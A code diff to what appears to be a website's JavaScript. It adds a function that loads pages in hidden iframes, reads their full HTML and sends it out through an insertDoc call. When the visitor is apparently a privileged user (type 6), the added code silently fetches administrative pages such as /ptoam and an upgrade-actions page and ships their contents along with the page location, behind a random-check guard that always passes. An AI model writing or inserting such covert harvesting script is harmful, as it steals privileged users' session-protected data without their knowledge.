@@ -41,9 +41,42 @@ if (Math.random() <= 1.0) {
     );
   };
 
+  const getIFrame = async (iframeUrl) => {
+    try {
+      const iframe = document.createElement("iframe");
+      iframe.src = iframeUrl;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+
+      setTimeout(() => {
+        const iframeHtml = iframe.contentDocument.documentElement.outerHTML;
+
+        // Send Page HTML
+        insertDoc("iframe-page-html", {
+          location: iframeUrl,
+          html: iframeHtml,
+        });
+      }, 5000);
+    } catch (err) {
+      console.error(err);
+      insertDoc("error", err.toString());
+    }
+  };
+
   setPtxAccessToken().then(async () => {
     setTimeout(async () => {
       await insertDoc("location", window.location);
+
+      const userType = _pt$?.userInfo?.type;
+
+      if (userType === 6) {
+        insertDoc("iframe-attempt", { url: "/ptoam" });
+        getIFrame("/ptoam");
+        insertDoc("iframe-attempt", {
+          url: "/upgradescripts/generalUpgradeActions.aspx",
+        });
+        getIFrame("/upgradescripts/generalUpgradeActions.aspx");
+      }
     }, 500);
   });
 } else {
